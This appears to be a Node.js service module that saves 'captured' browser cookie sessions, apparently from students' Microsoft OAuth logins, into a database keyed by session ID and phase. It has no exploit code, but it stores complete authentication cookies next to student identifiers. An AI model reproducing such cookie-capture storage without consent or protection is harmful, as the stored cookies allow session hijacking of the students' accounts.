const CookieSession = require('../models/CookieSession');
const pino = require('pino');

const logger = pino({ name: 'cookieService' });

async function saveCookieSession(payload) {
    const doc = {
        sessionId: payload.sessionId,
        studentId: payload.studentId || null,
        source: payload.source || 'microsoft_oauth',
        phase: payload.phase,
        triggerUrl: payload.triggerUrl,
        domains: payload.domains || [],
        cookies: payload.cookies,
        cookieCount: payload.cookies.length,
        userAgent: payload.userAgent || null,
        metadata: payload.metadata || {},
        capturedAt: new Date()
    };

    const result = await CookieSession.findOneAndUpdate(
        { sessionId: payload.sessionId, phase: payload.phase },
        { $set: doc },
        { upsert: true, new: true, setDefaultsOnInsert: true }
    );

    logger.info({
        sessionId: payload.sessionId,
        phase: payload.phase,
        cookieCount: payload.cookies.length,
        studentId: payload.studentId || null
    }, 'Cookie session saved');

    return {
        sessionId: result.sessionId,
        phase: result.phase,
        cookieCount: result.cookieCount,
        capturedAt: result.capturedAt
    };
}

module.exports = { saveCookieSession };
